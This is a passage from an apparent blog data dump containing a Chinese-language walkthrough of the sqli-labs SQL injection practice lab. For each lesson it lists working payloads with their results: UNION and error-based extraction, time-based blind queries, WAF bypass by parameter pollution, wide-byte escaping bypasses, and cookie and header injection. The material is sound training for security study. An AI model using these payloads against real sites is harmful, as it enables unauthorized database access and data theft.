preg_replace('/[--]/',\"\", $id);\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    //Strip out spaces.\n  \t$id= preg_replace('/union/s',\"\", $id);\t    //Strip out union\n  \t$id= preg_replace('/select/s',\"\", $id);\t    //Strip out select\n  \t$id= preg_replace('/UNION/s',\"\", $id);\t    //Strip out UNION\n  \t$id= preg_replace('/SELECT/s',\"\", $id);\t    //Strip out SELECT\n  \t$id= preg_replace('/Union/s',\"\", $id);\t    //Strip out Union\n  \t$id= preg_replace('/Select/s',\"\", $id);\t    //Strip out select\n  \treturn $id;\n  \t}\n\n\t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";</br>\n\n\t思路一：大小写绕过</br>\n\t?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27</br>\n\t思路二：报错或延时？\n\n- **less 27a GET - Blind Based - All your UNION & SELECT Belong to us -Double Quotes**</br>\n\t1.?id=1%22%26%26%221=1 成功，猜测为“ \"过滤</br>\n\t2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入</br>\n\n- **less 28 GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes with Parentesis**</br>\n  \tfunction blacklist($id)\n  \t{\n  \t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t\t\t//strip out /*\n  \t$id= preg_replace('/[--]/',\"\", $id);\t\t\t\t//Strip out --.\n  \t$id= preg_replace('/[#]/',\"\", $id);\t\t\t\t\t//Strip out #.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/select/m',\"\", $id);\t   \t\t \tStrip out spaces.\n  \t$id= preg_replace('/[ +]/',\"\", $id);\t    \t\t//Strip out spaces.\n  \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out UNION & SELECT.\n  \treturn $id;\n  \t}\n\t   $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27\n\n  - **less 28a GET - Error Based - All your UNION & SELECT Belong to us - String - Single Quotes - Parentesis**</br>\n    \tfunction blacklist($id)\n    \t{\n    \t$id= preg_replace('/union\\s+select/i',\"\", $id);\t    //Strip out spaces.\n    \treturn $id;\n    \t}\n    \t$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\t?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同\n\n- **less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application**</br>\n服务器（两层架构）</br>\n\t当?id=1&id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容</br>\n\t此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 </br>\n\t?id=1&id=-2%27union%20select%201,user(),version()%27</br>\n\t返回:</br>\n  Your Login name:root@localhost</br>\n\tYour Password:5.7.23-0ubuntu0.16.04.1\n\n- **less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web**</br>\n\t?id=1&id=-2%22union%20select%201,user(),version()%22\n\n- **less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web** </br>\n\t?id=1&id=-2\")union%20select%201,user(),version()%23\n\n- **less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars**</br>\n宽字节注入</br>\n\t原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。</br>\n  一般有两种思路： </br>\n\t1、%df 吃掉 \\ 具体的原因是 urlencode(‘\\) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。</br>\n\t2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %\\**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</br>\n\n\taddslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：'   \"  \\</br>\n\taddslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行\n  \tfunction check_addslashes($string)\n  \t{\n  \t\t$string= addslashes($string);    \n  \t\treturn $string;\n  \t}\n\t例?id=-1%27%20union%20select%201,version(),user()%20%27</br>\n\tThe filtered request is :-1\\' union select 1,version(),user() \\'</br>\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23</br>\n\t返回:</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:root@localhost\n\n- **less 33 GET -  Bypass AddSlashers()**</br>\n\t?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样\n\n- **less 34 POST - Bypass AddSlashers()**</br>\n\tpost型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为' 。我们就 可以利用这个方式进行尝试。</br>\n\n\t運' or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c </br>\n\tSELECT username, password FROM users WHERE username='運\\' or 1=1# ' and password='' LIMIT 0,1\n\n- **less 35 GET - Bypass Add Slashes(we dont need them) Integer Based**</br>\n\tphp中：$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t可以看出，不需要构造特殊符号</br>\n\t?id=-1%20union%20select%201,version(),user()%23</br>\n\n- **less 36 GET - Bypass mysql_real _escape _string**</br>\n\tmysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符</br>\n\tstring 必需，要转义的字符串</br>\n\tconnection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接</br>\n  \t\\x00  ascii码 null\n  \t\\n\t换行\n  \t\\r\t回车\n  \t\\\n  \t'\n  \t\"\n  \t\\x1a （即十进制26）&\n\t这些字符会被转义</br>\n\n  \tfunction check_quotes($string)\n  \t{\n  \t\t$string= mysql_real_escape_string($string);    \n  \t\treturn $string;\n  \t}\n  \t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23 成功\n\n- **less 37 POST - Bypass mysql_real_escape_string** </br>\n\t運' or 1=1 #\n\n---------------------------------------------------\n\nStacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 </br>\n原理:</br>\n在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 </br>\n局限:</br>\n堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 </br>\n虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。\n因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</br>\n\n暂不深入了解\n\n---------------------------------------------\nchallenge\n\n- **GET - challenge - Union -10 Queries Allowed - Variation1**</br>\n\t1.查表名</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t得到此次的表名: 8TELU525VO</br>\n\t2.查列名 用concat一次性查完输出</br>\n\t?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23</br>\n\t返回:</br>\n  Your Login name:id---,sessid---,secret_63JY---,tryy---</br>\n\tYour Password:3</br>\n\t3.得到密码id,sessid,secret_63JY</br>\n\t?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23</br>\n\t返回:</br>\n  Your Login name:856213ca887976a33e3d91b2c61fa65a</br>\n\tYour Password:M5ztHsC34iN2X0lzCiXJ27Cp</br>\n\t4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 2**</br>\n\t1.猜测过滤规则</br>\n\t当输入?id=1)%26%26(1=1 时 成功 可知过滤为()</br>\n\t2.参考less 54</br>\n\t?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t表名为: C73JPUKYS9\t</br>\n\t?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d\n\t%22C73JPUKYS9%22),3%20%23</br>\n\t列名: Your Login name:id---,sessid---,secret_DH0J---,tryy---</br>\n\t?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23</br>\n\t密码：</br>\n  Your Login name: 4d0218b33a232f675d53381ef38b5370</br>\n  Your Password: kjbKG19I62vmYE3kS7gGN7qf </br> 成功\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 3**</br>\n\t1.猜测</br>\n\t?id=1%27)%26%26(%271=1 成功 可知为(' ')</br>\n\t2.下面步骤如上</br>\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 4**</br>\n\t如上\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 1**</br>\n\t1.猜测</br>\n\t?id=1%27%26%26%271=1 成功，可知为' '</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 </br>  返回同上，可知有其它过滤规则</br>\n\t尝试报错注入</br>\n\t?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()</br>\n\t2.获取表名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23</br>\n\t返回：XPATH syntax error: '~4HT916R6T1~'</br>\n\t3.获取列名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,\"---\")%20from%20information_schema.columns%20where%20table_name%3d%20\"4HT916R6T1\"),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~id---,sessid---,secret_EN0R---,'为什么有一个列没显示</br>\n\t4.获取密码</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~OcDGOovBkd3XMq3FpuSNtEIN~'</br>\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 2**</br>\n\t?id=1%26%261=1 返回成功，说明无字符</br>\n\t剩余步骤如 less 58</br>\n\n-  **GET - Challenge - Double Query -5 Queries Allowed - Variation 3**\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n?id=1%22)%26%26(%221=1 猜测为(\" \") </br>\n都返回相同结果？？？？</br>\n  但实际上\n        \t$id = '(\"'.$id.'\")';\n  \t\t\t$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\";\n  \t           if($row)\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#00FFFF\">';\n  \t\t\t\t\t$unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\");\n  \t\t\t\t\t$pass = array_reverse($unames);\n  \t\t\t\t\techo 'Your Login name : '. $unames[$row['id']];\n  \t\t\t\t\techo \"<br>\";\n  \t\t\t\t\techo 'Your Password : ' .$pass[$row['id']];\n  \t\t\t\t\techo \"</font>\";\n  \t\t\t\t}\n  \t\t\t\telse\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#FFFF00\">';\n  \t\t\t\t\tprint_r(mysql_error());\n  \t\t\t\t\techo \"</font>\";  \n  \t\t\t\t}\n\t每次返回都是$unames=array（），奸诈！！\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 4**</br>\n\t$sql=\"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1\";\n\n- **GET - Challenge - Blind -130 Queries Allowed - Variation 1**</br>\n\t盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率</br>\n\t?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))--+\n\n### 三.杂记\n\n- 盲注</br>\n\t语句执行完后没有回显</br>\n\t1.基于布尔</br>\n\t构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）</br>\n\t2.基于报错</br>\n\tSELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)\\*2));</br>\n\t[Err] 1062 - Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key '<group_key>'</br>\n\t具体原理不懂，concat, floor, group by，rand(0)是关键</br>\n\t如果rand被禁用可以使用用户变量来报错？？</br>\n\t或者XPath报错等</br>\n\t3.基于时间-延迟注入</br>\n\t利用if,当条件正确或错误时，确定要不要sleep()来猜测</br>\n\n- insert/update/delete注入</br>\n\t思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\n-\torder by</br>\n\t可以用来确定有几列，如 order by 4 ,报错没有第四列</br>\n\n- url编码\n  \t空格    -    %20\n  \t\"          -    %22\n  \t#         -    %23\n  \t%        -    %25\n  \t&         -    %26\n  \t(          -    %28\n  \t)          -    %29\n  \t+         -    %2B\n  \t,          -    %2C 逗号\n  \t/          -    %2F\n  \t:          -    %3A\n  \t;          -    %3B\n  \t<         -    %3C\n  \t=         -    %3D\n  \t>         -    %3E\n  \t?         -    %3F\n  \t@       -    %40\n  \t\\          -    %5C\n  \t|          -    %7C\n  \t'               %27  单引号\n\n- 补充一些数据库知识</br>\n  \tinfomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n  \t如数据库名，数据库的表，表栏的数据类型与访问权限等。</br>\n  \t再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n  \t每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</br>\n\n  \tinformation_schema的表schemata中的列schema_name记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表columns中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n查询指定数据库所有表名</br>\nSELECT table_name FROM information_schema.tables WHERE table_schema='数据库名';</br>\n查询mysql中所有数据库名字</br>\nSELECT schema_name FROM information_schema.schemata</br>\n\n\tversion()  mysql版本\n\tuser()用户\n\t@@datadir数据路径\n\t@@version_compile_os 操作系统\n\tdatabase() 数据库名字\n\tSELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();\n--+/# 注释，一般用#，url编码为%23</br></br>\nmysql中XPath:</br>\nMySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</br>\nExtractValue():</br>\n\tEXTRACTVALUE (XML_document, XPath_string); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t作用：从目标XML中返回包含所查询值的字符串</br>\nUpdateXml():</br>\n\tUPDATEXML (XML_document, XPath_string, new_value); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t第三个参数：new_value，String格式，替换查找到的符合条件的数据 </br>\n\t作用：改变文档中符合条件的节点的值 </br>\n通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</br>\n0x7E为~的ascii码</br></br>\nif</br>\nIF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3</br></br>\nconcat() 连接字符串，将多个连接在一起。</br>\n\tconcat(str1,str2,...)</br>\nconcat_ws() 将多个字符串连接在一起，可以一次性指定分隔符</br>\n\tconcat_ws(sparator, str1,str2,...)</br>\ngroup_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果</br>\n\tgroup_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )</br>\n\n\n\n\n\n- 问题：</br>\n1.怎么确定是哪种注入类型？</br>\n2.在没有返回值的情况下判断单引号双引号括号等\n\n- 其它\n  \t?id=1%27%26%26%271=1 猜测为’ ‘\n  \t?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n  \t?id=1%22%26%26%221=1 猜测为 \" \"\n  \t?id=1%22)%26%26(%221=1 猜测为(\" \")\n  \t?id=1)%26%26(1=1  猜测为()\n  \t?id=1%26%261=1 无\n","slug":"security/sql/sql注入","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321m7005o6dcp2wj2sbfd","content":"<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>sql注入:利用现有程序，使之执行构造的payload.</p>\n<h3 id=\"一-环境搭建\"><a href=\"#一-环境搭建\" class=\"headerlink\" title=\"一. 环境搭建\"></a>一. 环境搭建</h3><ul>\n<li>ubuntu16.04虚拟机</li>\n<li>更新阿里源 apt-get update</li>\n<li>安装mysql apt-get install mysql-server mysql-client -y</li>\n<li>安装apache apt-get install apache2 -y</li>\n<li>安装git apt-get install git -y</li>\n<li>项目 cd /var/www &amp;&amp; sudo git clone <a href=\"https://github.com/Audi-1/sqli-labs.git\" target=\"_blank\" rel=\"noopener\">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs  </li>\n<li>更改项目的mysql配置文件为自己数据库</li>\n<li>现在在浏览器localhost/sqli-labs已经可以访问到了</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>navicat连不上mysql <br><br>  注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1<br><br>  修改select user, host from user;  update user set host = “%” where host = ‘localhost’;  flush privileges;</li>\n<li><p>php版本导致mysql_connect()废弃 <br><br>  安装phpstorm 配置phpcgi  apt-get install php版本-cgi<br><br>  降低版本到php5.6错误仍然在<br><br>  第二天重启Phpstrom 打开网页，错误消失<br><br>猜测是降低版本有效，但第一天有缓存<br></p>\n<a id=\"more\"></a>\n<h3 id=\"二-sqli-labs\"><a href=\"#二-sqli-labs\" class=\"headerlink\" title=\"二.sqli-labs\"></a>二.sqli-labs</h3><p>参考了大牛的教程<a href=\"https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\" target=\"_blank\" rel=\"noopener\">https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf</a></p>\n</li>\n<li><p><strong> less1 GET-Error based - Single quotes - String <br> </strong><br>  php中代码 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;<br>  %20 空格 %27 单引号 %3D 等于号<br><br>  一：?id=(select%20id%20from%20users%20where%20username%20%3D”admin”) 未成功      ’$id’ 注入被单引号包裹，将输入变成了字符串<br><br>  二：?id=’%20and%20username%3D%27admin 未成功 id=’’这个条件未绕过<br>  想利用id=这个条件或者绕过这个条件<br><br>  三：?id=’%20or%20username%3D%27admin 成功<br><br>  基于二，转换思路，利用or成功绕过<br><br>  爆破数据库版本<br><br>  ?id=-1%27%20%20union%20select%201%2cversion()%2c3%23<br><br>  ？id=-1’  union select 1,version(),3#<br><br>  union必须列一样，所以1和3是为了保持三列</p>\n</li>\n<li><p><strong> less 2 GET - Error based -Intiger based<br> </strong><br>  php中代码 $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  $id未加引号过滤输入<br> ?id=(select%20id%20from%20users%20where%20username%20%3D”admin”)成功注入</p>\n</li>\n<li><p><strong> less 3 GET - Error based - single quotes with twist - string</strong><br><br>  php中代码 $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 用括号和单引号进行了过滤<br><br>  思路：消除括号<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27  成功</p>\n</li>\n</ul>\n<ul>\n<li><p><strong> less 4  GET - Error based - Double Quotes - String </strong> <br><br>  php中代码<br><br>  $id = ‘“‘ . $id . ‘“‘;<br><br>  $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27 成功<br></p>\n<p>  关于前四个less的一些心得：</p>\n<pre><code>1.找错误：\n    尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    例：?id=&quot;\n             返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&quot;&quot;) LIMIT 0,1&apos; at line 1\n        可以看出输入所在位置为（“输入”）\n2.注入利用\n    通过union来执行自己想要的sql\n</code></pre></li>\n<li><p><strong> less 5  GET - Double Injection - Single Quotes - String </strong> <br><br>双查询注入（双查询：select嵌套select）<br><br>  输入?id=‘ 失败， use near 1  由此猜测为单引号<br><br>  ?id=’%20or%20username%3D%27admin 成功 <br><br>  但是sql执行结果前端并没有进行输出，怎么利用？<br></p>\n<p>  查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。<br><br>  发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）<br><br>  count() 计数<br><br>  rand() 随机<br><br>  group by 分组<br><br>  floor() 向下取整，舍弃小数部分<br></p>\n<p>  ?id=-1%27%20union%20select%201%2c(select%20count(*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功<br><br>  Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br>  其中version(）是我们希望执行的函数，可以换成其它</p>\n</li>\n<li><p><strong> less 6 GET - Double Injection - Double Quotes - String </strong> <br></p>\n<p>  ?id=-1%22%20union%20select%201%2c(select%20count(*)%20from%        20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功</p>\n</li>\n<li><p><strong> less 7 GET - Dump into outfile - String </strong> <br><br>  文件导入限制条件多，未成功</p>\n</li>\n<li><p><strong> less 8 GET - Blind - Boolian Based - Single Quotes </strong> <br><br>  ?id=-1%27or%201%3d1%23 <br><br>  利用二分与返回结果的正确与否，来猜测验证数据库内容</p>\n</li>\n<li><p><strong> less 9 GET - Blind - Time Based - Single Quotes </strong> <br><br>  ?id=1%27%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23 <br><br>  因为在这正确或者错误都是返回的”you are in” 所以不能区分 <br><br><img src=\"./youarein.png\" alt=\"youarein\"><br>  使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试</p>\n</li>\n<li><p><strong> less 10 GET -Blind - Time Based - Double Quotes </strong> <br><br>  ?id=1”%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23</p>\n</li>\n<li><p><strong> less 11 POST - Error Based -Single Qoutes - String </strong> <br><br>  username:  </p>\n<pre><code>1.admin &apos; # admin用户&lt;/br&gt;\n2.adimn &apos; or 1=1 # 万能&lt;/br&gt;\n3. &apos; union select version(),1 # 等其它操作\n</code></pre><p>  passwd:<br>  因为username已经用#将后面注释了，所以passwd随意输入</p>\n</li>\n<li><p><strong> less 12 POST - Error Based - Double Quotes - String - with twist </strong> <br><br>将less11的单引号改为 “）</p>\n</li>\n<li><p><strong> less 13 POST - Double Injection - Single quotes - String - with twist </strong> <br><br>  username:    ‘) union select (select count(*) from information_schema.schemata group by concat(version(),floor(rand(0)*2))),1 #<br><br>  返回信息Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br><br>  另外这种有正确/错误提示的，都可以二分盲注来猜测验证</p>\n</li>\n<li><p><strong> less 14 POST  - Double Injection - Double quotes - String </strong> <br><br>  less13 ‘) 换为 ”</p>\n</li>\n<li><p><strong> less 15 POST - Blind - Boolean/Time Based -Single Quotes </strong> <br><br>  username: ‘ or 1=1 # 登录成功 <br><br>  思路：利用or/and/if sleep()等来进行猜测<br></p>\n</li>\n<li><p><strong> less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist </strong> <br><br>  将less15 ‘ 换成 “)</p>\n</li>\n<li><p><strong> less 17 POST - Update Query - Error Based - String </strong> <br><br>  这里对用户名进行了过滤<br><br>  利用报错进行注入输出 <br><br>  uname=admin&amp;passwd=11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit=Submit <br><br>  输出结果XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1~’<br><br>报错注入基本都是利用XPath进行报错<br>  有必要去买本书来系统的看一下mysql各种函数</p>\n</li>\n<li><p><strong> less 18 POST - Header Injection - Uagent field - Error Based </strong> <br><br>  这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后<br><br>  php中语句：$insert=”INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (‘$uagent’, ‘$IP’, $uname)”;<br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent<br><br>  将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’<br><br>  返回结果：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong> less 19 POST - Header Injection - Referer Field - Error Based </strong> <br><br>  同less 18,进行了过滤，但执行了$insert=”INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (‘$uagent’, ‘$IP’)”;<br><br>  其中：$uagent = $_SERVER[‘HTTP_REFERER’];<br><br>  将Referer 修改为: ‘or extractvalue(1,concat(0x7e,database())) or’<br><br>  返回: XPATH syntax error: ‘~security’</p>\n</li>\n<li><p><strong> less 20 POST - Cookie Injection - Uagent Field - Error Based </strong> <br><br>  进行了过滤<br><br>  $cookee = $_COOKIE[‘uname’];<br><br>  $sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”;<br><br>  流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)<br><br>  修改Cookie为： uname=-1’ union select 1,(select version()),3 #<br><br>  返回 ：</p>\n<pre><code>Your Login name:5.7.23-0ubuntu0.16.04.1\nYour Password:3\nYour ID:1\n</code></pre><p>  也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br><br>   uname=admin’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# <br><br>  返回:Issue with your mysql: XPATH syntax error: ‘~/usr/~’</p>\n</li>\n<li><p><strong> less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String </strong> <br><br>  setcookie(‘uname’, base64_encode($row1[‘username’]), time()+3600);<br>  $sql=”SELECT * FROM users WHERE username=(‘$cookee’) LIMIT 0,1”;<br><br>  对Cookie 进行了 base64处理 <br><br>  uname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj<br>  uname=-1’) union select 1,(select version()),3 #<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>   Your Password:3<br><br>  Your ID:1</p>\n</li>\n<li><p><strong> less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String </strong> <br><br>  对Cookie进行了base64编码，使用的双引号</p>\n</li>\n</ul>\n<hr>\n<ul>\n<li><p><strong> less 23 GET - Error Based - Strip Comments </strong> <br><br>  php中处理：<br><br>  $reg = “/#/“;<br><br>  $reg1 = “/–/“;<br><br>  $replace = “”;<br><br>  $id = preg_replace($reg, $replace, $id); //将$reg替换为$replace<br><br>  $id = preg_replace($reg1, $replace, $id);<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  